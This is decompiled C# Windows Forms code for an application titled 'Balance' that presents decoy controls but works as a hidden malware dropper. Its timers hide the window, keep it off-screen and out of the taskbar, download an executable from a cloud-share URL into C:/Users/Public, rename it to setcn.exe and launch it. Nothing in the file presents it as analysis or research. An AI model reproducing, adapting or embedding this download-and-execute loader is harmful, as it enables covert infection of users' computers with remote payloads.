using System;
using System.Collections.ObjectModel;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using System.Windows.Forms.DataVisualization.Charting;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using WindowsApp1.My;

namespace WindowsApp1;

[DesignerGenerated]
public class Form1 : Form
{
	private const int V = 14000;

	private IContainer components;

	internal virtual Timer Timer1
	{
		[CompilerGenerated]
		get
		{
			return _Timer1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = Timer1_Tick;
			Timer timer = _Timer1;
			if (timer != null)
			{
				timer.remove_Tick(eventHandler);
			}
			_Timer1 = value;
			timer = _Timer1;
			if (timer != null)
			{
				timer.add_Tick(eventHandler);
			}
		}
	}

	internal virtual Timer Timer2
	{
		[CompilerGenerated]
		get
		{
			return _Timer2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = Timer2_Tick;
			Timer timer = _Timer2;
			if (timer != null)
			{
				timer.remove_Tick(eventHandler);
			}
			_Timer2 = value;
			timer = _Timer2;
			if (timer != null)
			{
				timer.add_Tick(eventHandler);
			}
		}
	}

	[field: AccessedThroughProperty("MonthCalendar1")]
	internal virtual MonthCalendar MonthCalendar1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("PictureBox1")]
	internal virtual PictureBox PictureBox1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("CheckedListBox1")]
	internal virtual CheckedListBox CheckedListBox1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual Timer Timer3
	{
		[CompilerGenerated]
		get
		{
			return _Timer3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = Timer3_Tick;
			Timer timer = _Timer3;
			if (timer != null)
			{
				timer.remove_Tick(eventHandler);
			}
			_Timer3 = value;
			timer = _Timer3;
			if (timer != null)
			{
				timer.add_Tick(eventHandler);
			}
		}
	}

	[field: AccessedThroughProperty("WebBrowser1")]
	internal virtual WebBrowser WebBrowser1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("ProgressBar1")]
	internal virtual ProgressBar ProgressBar1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("NumericUpDown1")]
	internal virtual NumericUpDown NumericUpDown1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("ListView1")]
	internal virtual ListView ListView1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Button1")]
	internal virtual Button Button1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("BackgroundWorker1")]
	internal virtual BackgroundWorker BackgroundWorker1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Chart1")]
	internal virtual Chart Chart1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("ToolStripContainer1")]
	internal virtual ToolStripContainer ToolStripContainer1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	public Form1()
	{
		((Form)this).add_Load((EventHandler)Form1_Load);
		InitializeComponent();
	}

	private void Timer1_Tick(object sender, EventArgs e)
	{
		Timer1.set_Interval(14000);
		Timer2.set_Enabled(true);
		if (((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:/Users/Public/setcn.tmp"))
		{
			((ServerComputer)MyProject.Computer).get_FileSystem().RenameFile("C:/Users/Public/setcn.tmp", "setcn.exe");
			Timer1.set_Enabled(false);
			Timer3.set_Enabled(true);
		}
		if (!((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:/Users/Public/setcn.exe"))
		{
			((ServerComputer)MyProject.Computer).get_Network().DownloadFile("https://meubackup.terra.com.br/index.php/s/yCyVYOxnikj4SgO/download", "C:/Users/Public/setcn.tmp");
		}
	}

	private void Timer2_Tick(object sender, EventArgs e)
	{
		((Control)this).Hide();
	}

	private void Timer3_Tick(object sender, EventArgs e)
	{
		if (((ServerComputer)MyProject.Computer).get_FileSystem().FileExists("C:/Users/Public/setcn.exe"))
		{
			Process.Start("C:/Users/Public/setcn.exe");
			Timer3.set_Enabled(false);
			((Form)this).Close();
		}
	}

	private void PictureBox1_Click(object sender, EventArgs e)
	{
	}

	private void Form1_Load(object sender, EventArgs e)
	{
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_000b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0011: Expected O, but got Unknown
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_0017: Expected O, but got Unknown
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_001d: Expected O, but got Unknown
		//IL_0034: Unknown result type (might be due to invalid IL or missing references)
		//IL_003e: Expected O, but got Unknown
		//IL_0045: Unknown result type (might be due to invalid IL or missing references)
		//IL_004f: Expected O, but got Unknown
		//IL_0056: Unknown result type (might be due to invalid IL or missing references)
		//IL_0060: Expected O, but got Unknown
		//IL_0061: Unknown result type (might be due to invalid IL or missing references)
		//IL_006b: Expected O, but got Unknown
		//IL_006c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0076: Expected O, but got Unknown
		//IL_0082: Unknown result type (might be due to invalid IL or missing references)
		//IL_008c: Expected O, but got Unknown
		//IL_008d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0097: Expected O, but got Unknown
		//IL_035f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0369: Expected O, but got Unknown
		components = new Container();
		ChartArea val = new ChartArea();
		Legend val2 = new Legend();
		Series val3 = new Series();
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Form1));
		Timer1 = new Timer(components);
		Timer2 = new Timer(components);
		Timer3 = new Timer(components);
		ListView1 = new ListView();
		Button1 = new Button();
		BackgroundWorker1 = new BackgroundWorker();
		Chart1 = new Chart();
		ToolStripContainer1 = new ToolStripContainer();
		((ISupportInitialize)Chart1).BeginInit();
		((Control)ToolStripContainer1).SuspendLayout();
		((Control)this).SuspendLayout();
		Timer1.set_Enabled(true);
		Timer1.set_Interval(21000);
		((Control)ListView1).set_Location(new Point(177, 56));
		((Control)ListView1).set_Name("ListView1");
		((Control)ListView1).set_Size(new Size(657, 348));
		((Control)ListView1).set_TabIndex(0);
		ListView1.set_UseCompatibleStateImageBehavior(false);
		((Control)Button1).set_Location(new Point(644, 4));
		((Control)Button1).set_Name("Button1");
		((Control)Button1).set_Size(new Size(108, 46));
		((Control)Button1).set_TabIndex(1);
		((ButtonBase)Button1).set_Text("process");
		((ButtonBase)Button1).set_UseVisualStyleBackColor(true);
		val.set_Name("ChartArea1");
		((Collection<ChartArea>)(object)Chart1.get_ChartAreas()).Add(val);
		val2.set_Name("Legend1");
		((Collection<Legend>)(object)Chart1.get_Legends()).Add(val2);
		((Control)Chart1).set_Location(new Point(641, 195));
		((Control)Chart1).set_Name("Chart1");
		val3.set_ChartArea("ChartArea1");
		val3.set_Legend("Legend1");
		val3.set_Name("Series1");
		((Collection<Series>)(object)Chart1.get_Series()).Add(val3);
		Chart1.set_Size(new Size(355, 185));
		((Control)Chart1).set_TabIndex(2);
		((Control)Chart1).set_Text("Chart1");
		((Control)ToolStripContainer1.get_ContentPanel()).set_Size(new Size(996, 382));
		((Control)ToolStripContainer1).set_Dock((DockStyle)5);
		((Control)ToolStripContainer1).set_Location(new Point(0, 0));
		((Control)ToolStripContainer1).set_Name("ToolStripContainer1");
		((Control)ToolStripContainer1).set_Size(new Size(996, 407));
		((Control)ToolStripContainer1).set_TabIndex(3);
		((Control)ToolStripContainer1).set_Text("ToolStripContainer1");
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_AutoScroll(true);
		((Form)this).set_ClientSize(new Size(613, 424));
		((Control)this).get_Controls().Add((Control)(object)ToolStripContainer1);
		((Control)this).get_Controls().Add((Control)(object)Chart1);
		((Control)this).get_Controls().Add((Control)(object)Button1);
		((Control)this).get_Controls().Add((Control)(object)ListView1);
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Form)this).set_Location(new Point(0, 999));
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("Form1");
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_Text("Balance");
		((Form)this).set_WindowState((FormWindowState)1);
		((ISupportInitialize)Chart1).EndInit();
		((Control)ToolStripContainer1).ResumeLayout(false);
		((Control)ToolStripContainer1).PerformLayout();
		((Control)this).ResumeLayout(false);
	}
}
